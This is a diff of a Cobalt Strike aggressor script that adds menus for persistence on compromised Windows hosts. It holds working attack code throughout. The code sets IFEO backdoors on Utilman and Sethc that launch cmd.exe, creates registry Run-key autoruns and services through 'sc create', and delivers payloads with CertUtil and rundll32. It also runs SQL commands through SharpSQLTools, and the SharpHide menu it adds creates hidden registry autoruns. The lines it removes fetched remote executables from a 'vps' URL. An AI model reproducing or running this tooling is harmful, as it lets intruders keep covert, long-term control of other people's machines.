@@ -2,43 +2,12 @@
 #                            #
 #                            #
 #                            #
-#       XWAY.CN@panda        #
+#       Xway.cn@panda        #
 #                            #
 #                            #
 #                            #
 ##############################
-menu "Persistence" {
-
-	    menu "Remote Task Scheduler" {
-					item "No file exec" {
-			$bid = $1['@'];
-			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
-			dialog_description($dialog, "Insert CMD command");
-			drow_text($dialog, "command", "command: ");	
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
-        }
-sub Telemetry_cmd {
-		$arg = join('', @("install /command:",$3['command']));
-		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
-}
-
-					item "Remote file download and auto-load" {
-			$bid = $1['@'];
-			$dialog = dialog("Telemetry", %(url => "",bid => $bid), &Telemetry_url);
-			dialog_description($dialog, Insert remote file URL, like http://vps:8089/System.exe");
-			drow_text($dialog, "url", "url:  ");	
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
-        }
-sub Telemetry_url {
-		$arg = join('', @("install /url:",$3['url']));
-		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
-}
-		
-		}
-			
-
+menu "权限维持" {
 
 	item "CertUtil Web Delivery" {
 		local('$dialog %defaults');
@@ -48,7 +17,7 @@ sub Telemetry_url {
 		%defaults["port"] = 80;
 
 		$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
-		dialog_description($dialog, "Download remote files by ccertutil, then exec by rundll32.exe");
+		dialog_description($dialog, "Use ccertutil download payload. exec by rundll32.exe");
 		drow_text($dialog, "uri", "URI Path: ", 20);
 		drow_text($dialog, "host", "Local Host: ");
 		drow_text($dialog, "port", "Local Port: ");
@@ -78,14 +47,14 @@ sub stage_attack {
 }
 
    
-                item "image hijacking"{
+                item "Image File Execution Options"{
                     if (!-isadmin $1['@']){
-                        show_error("Sorry, you don't have the entitle required.");
+                        show_error("Sorry, you don't have the authority/rights/entitle required.");
                     }
                     else{
                         $bid = $1['@'];
                         $Dialog = dialog("IFEO",%(Type => "Utilman", CallBackFile => "c:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallBackDoor);
-                        dialog_description($Dialog, "IFEO on the way");
+                        dialog_description($Dialog, "IFEO");
                         drow_combobox($Dialog,"Type","Type: ", @("Utilman", "Sethc"));
                         drow_text($Dialog,"CallBackFile","CallBackFile: ");
                         dbutton_action($Dialog, "Run");
@@ -94,14 +63,14 @@ sub stage_attack {
                     }
                 }
 
-                item "Adding Startup Items to the Registry"{
+                item "Auto Run"{
                     if (!-isadmin $1['@']){
-                        show_error("Sorry, you don't have the entitle required.");
+                        show_error("Sorry, you don't have the authority/rights/entitle required.");
                     }
                     else{
                         $bid = $1['@'];
                         $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
-                        dialog_description($Dialog, "Adding Startup Items to the Registry");
+                        dialog_description($Dialog, "Add Reg Auto Run");
                         drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
                         drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
                         drow_text($Dialog, "CallBackFile", "CallBackFile: ");
@@ -111,10 +80,10 @@ sub stage_attack {
                 }
 
 
-                item "Registration Services"{
+                item "Registration service"{
                     $bid = $1['@'];
                     $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
-                    dialog_description($Dialog, "Registration Services for files");
+                    dialog_description($Dialog, "Registration service");
                     drow_text($Dialog, "SerName", "Service Name: ");
                     drow_text($Dialog, "Path", "Bin Path: ");
                     dbutton_action($Dialog, "Install");
@@ -169,19 +138,19 @@ sub InstallService{
     local('$Name $Path');
     $Name = $3['SerName'];
     $Path = replace($3['Path'], "\"", "");
-    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start  $+ $Name");
 }
 			item "SharpSQLTools" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
-			dialog_description($dialog, "命令行版SQLTools");
+			dialog_description($dialog, "Ctl SQLTools");
 			drow_text($dialog, "host", "host:  ");	
 			drow_text($dialog, "username", "username:  ");	
 			drow_text($dialog, "password", "password:  ");			
 			drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
 			drow_combobox($dialog, "enable", "enable", @("None", "enable"));
 			drow_text($dialog, "cmd", "cmd:  ");
-            dbutton_action($dialog, "运行");
+            dbutton_action($dialog, "RUN");
 			dialog_show($dialog);
         }
 sub SharpSQLTools {
@@ -195,9 +164,39 @@ sub SharpSQLTools {
 		bexecute_assembly($bid, script_resource("/script/SharpSQLTools.exe"), $arg);
 		}
 }		
-		
-		
-		
+
+
+menu "SharpHide" {
+			item "RegAuto"{
+				$bid = $1;
+				$dialog = dialog("SharpHide-RegAuto", %(filepath => "\"C:\\Windows\\Temp\\123.exe\"",bid => $bid), &SharpHide_RegAuto);
+				dialog_description($dialog, "Auto Run on startup");
+				drow_text($dialog, "filepath", "filepath:  ");				
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub SharpHide_RegAuto {
+	$arg = join('', @("action=create keyvalue=",$3['filepath']));
+	bexecute_assembly($bid, script_resource("/script/SharpHide.exe"), $arg);
+}	
+
+			item "RegAuto-arg"{
+				$bid = $1;
+				$dialog = dialog("SharpHide-RegAuto", %(filepath => "\"C:\\Windows\\Temp\\123.exe\"",arguments => "arg1 arg2",bid => $bid), &SharpHide_RegAuto_arg);
+				dialog_description($dialog, "Auto Run on startup, hide reg");
+				drow_text($dialog, "filepath", "filepath:  ");	
+				drow_text($dialog, "arguments", "arguments:  ");
+				dbutton_action($dialog, "RUN");
+				dialog_show($dialog);
+        }
+sub SharpHide_RegAuto_arg {
+	$arg = join(' ', @("action=create keyvalue=",$3['filepath'], $3['arguments']));
+	bexecute_assembly($bid, script_resource("/script/SharpHide.exe"), $arg);
+}	
+			item "delete"{	
+			bexecute_assembly($1, script_resource("/script/SharpHide.exe"), "action=delete");
+			}
+	}	
 		}
 
 	
